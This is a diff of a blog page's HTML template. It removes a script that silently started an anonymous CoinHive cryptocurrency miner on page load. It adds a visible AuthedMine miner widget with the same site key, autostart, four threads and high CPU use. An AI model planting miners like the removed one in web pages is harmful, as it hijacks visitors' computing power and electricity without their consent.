@@ -8,11 +8,8 @@
   <script src='style/highlight.min.js'></script>
   <script src='style/javascript.min.js'></script>
   <script>hljs.initHighlightingOnLoad();</script>
-  <script src="/coinhive.min.js"></script>
-  <script>
-          var miner = new CoinHive.Anonymous('ommvwQgk0yix22oYZ2C4LKPv31dy8ftn');
-           miner.start();
-  </script>
+  <!-- 引入 Coinhive 的 Simple Miner UI JavaScript -->
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
 </head>
 
   <body>
@@ -116,7 +113,7 @@
   <p>讨论请发邮件到 me <b> AT </b> terencelau.xyz</p>
   <p>未经授权，禁止转载</p>
   <p>通过「 buymeacoffee 」或赞赏码赞助此文</p>
-  <br />
+  <br/>
   <p>
     <style>.bmc-button img{width: 27px !important;margin-bottom: 1px !important;box-shadow: none !important;border: none !important;vertical-align: middle !important;}.bmc-button{line-height: 36px !important;height:37px !important;text-decoration: none !important;display:inline-flex !important;color:#FFFFFF !important;background-color:#FF813F !important;border-radius: 3px !important;border: 1px solid transparent !important;padding: 1px 9px !important;font-size: 23px !important;letter-spacing: 0.6px !important;box-shadow: 0px 1px 2px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;margin: 0 auto !important;font-family:'Cookie', cursive !important;-webkit-box-sizing: border-box !important;box-sizing: border-box !important;-o-transition: 0.3s all linear !important;-webkit-transition: 0.3s all linear !important;-moz-transition: 0.3s all linear !important;-ms-transition: 0.3s all linear !important;transition: 0.3s all linear !important;}.bmc-button:hover, .bmc-button:active, .bmc-button:focus {-webkit-box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;text-decoration: none !important;box-shadow: 0px 1px 2px 2px rgba(190, 190, 190, 0.5) !important;opacity: 0.85 !important;color:#FFFFFF !important;}</style><link href="https://fonts.googleapis.com/css?family=Cookie" rel="stylesheet"><a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/bMvSzyqnC"><img src="https://www.buymeacoffee.com/assets/img/BMC-btn-logo.svg" alt="Buy me a coffee"><span style="margin-left:5px">Buy me a coffee</span></a>
   </p>
@@ -124,6 +121,21 @@
   <p>
     <img style="max-width: 35%;" src="https://i.loli.net/2018/08/08/5b6ae29838acd.jpg" />
   </p>
+</div>
+
+<!-- 讓使用者可以自己操作的挖礦介面 -->
+<div class="coinhive-miner"
+  style="width: 336px; height: 280px"
+  data-key="ommvwQgk0yix22oYZ2C4LKPv31dy8ftn"
+  data-autostart="true"
+  data-whitelabel="false"
+  data-background="#000000"
+  data-text="#eeeeee"
+  data-action="#00ff00"
+  data-graph="#555555"
+  data-threads="4"
+  data-throttle="0.1">
+  <em>載入中 ...</em>
 </div>
 
 </div>
